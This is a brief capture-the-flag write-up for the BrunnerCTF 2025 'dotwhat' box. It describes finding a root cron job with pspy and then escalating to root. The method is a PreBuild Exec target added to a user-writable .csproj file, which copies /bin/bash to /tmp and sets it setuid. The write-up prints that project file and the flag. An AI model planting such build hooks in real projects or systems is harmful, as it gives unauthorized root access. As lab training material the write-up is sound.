Root for this box is about abusing cronjobs and dotnet project builds. Luckily for us, this box is setup with internet access so we can bring our own tools pretty easily :D 

For this you can use pspy to monitor for background processes to find crons. About every minute a cron is used to run a build as root. 

![alt text](/CTF-writeups/2025/brunnerctf-2025/images/dotwhat-cron.png)

And because this web app is running from the user's directory, and owned by them too, we can edit files.

I just added a prebuild command to the `.csproj` file. Here, I copied `/bin/bash` then use setuid to get root.

```
<Project Sdk="Microsoft.NET.Sdk.Web">

  <PropertyGroup>
    <PreserveCompilationContext>true</PreserveCompilationContext> <!-- Required for RazorLight...  -->
    <TargetFramework>net8.0</TargetFramework>
    <Nullable>enable</Nullable>
    <ImplicitUsings>enable</ImplicitUsings>
  </PropertyGroup>

  <ItemGroup>
    <PackageReference Include="RazorLight" Version="2.3.1" />
  </ItemGroup>


  <Target Name="PreBuild" AfterTargets="PreBuildEvent">
    <Exec Command="cp /bin/bash /tmp/benkyou; chmod 4755 /tmp/benkyou" />
  </Target>

</Project>
```

![alt text](/CTF-writeups/2025/brunnerctf-2025/images/dotwhat-root.png)

Flag: `brunner{M1Gr4T3_Th353_pR1v1l3G35!_H4H4_G0T_3M}`


Solved by: benkyou